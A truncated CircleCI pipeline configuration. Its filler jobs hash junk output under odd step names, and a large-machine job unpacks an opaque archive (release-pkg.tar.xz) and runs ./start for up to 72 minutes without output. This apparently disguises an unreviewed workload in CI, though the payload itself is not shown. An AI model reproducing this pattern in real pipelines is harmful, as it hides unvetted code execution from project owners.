version: 2.1

jobs:
  phase_aug20-canary:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: jibe
          command: |
            mkdir -p /tmp/outbox
            set +o pipefail 2>/dev/null; yes abc | head -n 518254 | sha1sum > /tmp/outbox/result.log; true
            echo "ready: $(sha256sum /tmp/outbox/result.log | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/outbox
          paths:
            - result.log
  aug20-canary:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/outbox
      - run:
          name: Inherit stage
          command: |
            { head -c 200 /tmp/outbox/counts.jsonl > /dev/null; echo "peek ok" ; } || true
      - run:
          name: Mirror project
          command: git clone --depth 2 --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: cat release-pkg.tar.xz | tar xJf -
      - run:
          no_output_timeout: 72m
          command: taskset -c 0-3 ./start
  phase_dotnet8-test:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/outbox
      - run:
          name: denied again
          command: |
            mkdir -p /tmp/outbox
            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /tmp/outbox/relay.txt
            echo "ready: $(sha256sum /tmp/outbox/relay.txt | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/outbox
          paths:
